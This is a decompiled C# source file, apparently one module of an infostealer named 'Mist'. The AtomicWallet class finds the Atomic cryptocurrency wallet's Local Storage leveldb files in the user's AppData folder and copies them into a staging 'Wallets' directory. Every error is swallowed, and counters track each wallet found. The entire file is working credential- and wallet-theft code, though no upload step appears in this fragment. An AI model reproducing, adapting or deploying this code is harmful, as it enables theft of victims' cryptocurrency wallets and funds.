﻿using System;
using System.IO;

namespace Mist
{
	// Token: 0x02000065 RID: 101
	internal class AtomicWallet
	{
		// Token: 0x06000282 RID: 642 RVA: 0x00012398 File Offset: 0x00010598
		public static void AtomicStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(AtomicWallet.atomDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(AtomicWallet.atomDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + AtomicWallet.atomDir);
						fileInfo.CopyTo(directorypath + AtomicWallet.atomDir + fileInfo.Name);
					}
					AtomicWallet.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000157 RID: 343
		public static int count = 0;

		// Token: 0x04000158 RID: 344
		public static string atomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";

		// Token: 0x04000159 RID: 345
		public static string atomDir2 = Help.AppDate + "\\atomic\\Local Storage\\leveldb\\";
	}
}
